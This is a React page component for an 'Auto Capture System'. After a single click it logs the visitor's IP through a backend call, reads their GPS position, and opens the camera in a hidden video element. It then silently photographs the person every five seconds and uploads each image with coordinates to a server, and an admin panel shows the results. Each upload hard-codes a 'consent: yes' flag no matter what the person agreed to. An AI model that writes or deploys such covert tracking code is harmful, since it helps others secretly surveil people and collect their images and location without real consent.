import React, { useRef, useState } from "react";

const BACKEND = process.env.NEXT_PUBLIC_BACKEND || "http://localhost:4000";

export default function HomePage() {
  const [loading, setLoading] = useState(false);
  const [autoMode, setAutoMode] = useState(false);

  const intervalRef = useRef<number | null>(null);
  const videoRef = useRef<HTMLVideoElement>(null);
  const [stream, setStream] = useState<MediaStream | null>(null);

  // -------------------- TRACK IP --------------------
  async function handleTrack() {
    await fetch(`${BACKEND}/api/track`);
  }

  // -------------------- GPS --------------------
  async function getGPS() {
    return new Promise<GeolocationPosition | null>((resolve) => {
      if (!navigator.geolocation) return resolve(null);

      navigator.geolocation.getCurrentPosition(
        (pos) => resolve(pos),
        () => resolve(null)
      );
    });
  }

  // -------------------- CAMERA --------------------
  async function openCamera(startAuto = false) {
    try {
      const s = await navigator.mediaDevices.getUserMedia({ video: true });
      setStream(s);

      if (videoRef.current) {
        videoRef.current.srcObject = s;
        await videoRef.current.play();
      }

      if (startAuto) startAutoCapture();
    } catch (err) {
      alert("Camera permission denied");
    }
  }

  // -------------------- TAKE PHOTO --------------------
  async function takePhoto(silent = false) {
    if (!videoRef.current) return;

    const canvas = document.createElement("canvas");
    canvas.width = videoRef.current.videoWidth;
    canvas.height = videoRef.current.videoHeight;
    canvas.getContext("2d")?.drawImage(videoRef.current, 0, 0);

    const blob = await new Promise<Blob | null>((resolve) =>
      canvas.toBlob(resolve, "image/jpeg", 0.9)
    );

    if (!blob) return;

    const pos = await getGPS();
    const fd = new FormData();

    fd.append("photo", blob);
    fd.append("consent", "yes");

    if (pos) {
      fd.append("latitude", String(pos.coords.latitude));
      fd.append("longitude", String(pos.coords.longitude));
    }

    await fetch(`${BACKEND}/api/upload-photo`, {
      method: "POST",
      body: fd
    });

    // Stop camera only in manual mode
    if (!silent && !autoMode && stream) {
      stream.getTracks().forEach((t) => t.stop());
      setStream(null);
    }
  }

  // -------------------- AUTO CAPTURE --------------------
  function startAutoCapture() {
    if (autoMode) return;

    setAutoMode(true);

    intervalRef.current = window.setInterval(() => {
      takePhoto(true);
    }, 5000);
  }

  function stopAutoCapture() {
    setAutoMode(false);

    if (intervalRef.current !== null) {
      clearInterval(intervalRef.current);
      intervalRef.current = null;
    }

    if (stream) {
      stream.getTracks().forEach((t) => t.stop());
      setStream(null);
    }
  }

  // -------------------- RUN ALL --------------------
  async function runAll() {
    setLoading(true);

    await handleTrack();
    await getGPS();
    await openCamera(true);

    // Take first photo instantly
    setTimeout(() => takePhoto(true), 1000);

    setLoading(false);
  }

  // -------------------- UI --------------------
  const buttonStyle = {
    padding: "14px 28px",
    margin: "10px",
    borderRadius: "6px",
    fontSize: "16px",
    cursor: "pointer",
    border: "none",
    color: "white"
  };

  return (
    <main style={{ textAlign: "center", padding: 40 }}>
      
      <h1>Auto Capture System</h1>

      <button
        onClick={runAll}
        style={{ ...buttonStyle, background: "green" }}
        disabled={loading}
      >
        {loading ? "Starting..." : "Run All"}
      </button>

      {autoMode && (
        <button
          onClick={stopAutoCapture}
          style={{ ...buttonStyle, background: "red" }}
        >
          Stop Auto Capture
        </button>
      )}

      {/* ADMIN BUTTON */}
      <button
        onClick={() => window.open("/admin", "_blank")}
        style={{ ...buttonStyle, background: "blue" }}
      >
        Admin Panel
      </button>

      {/* Hidden camera stream */}
      <video ref={videoRef} style={{ display: "none" }} />
    </main>
  );
}
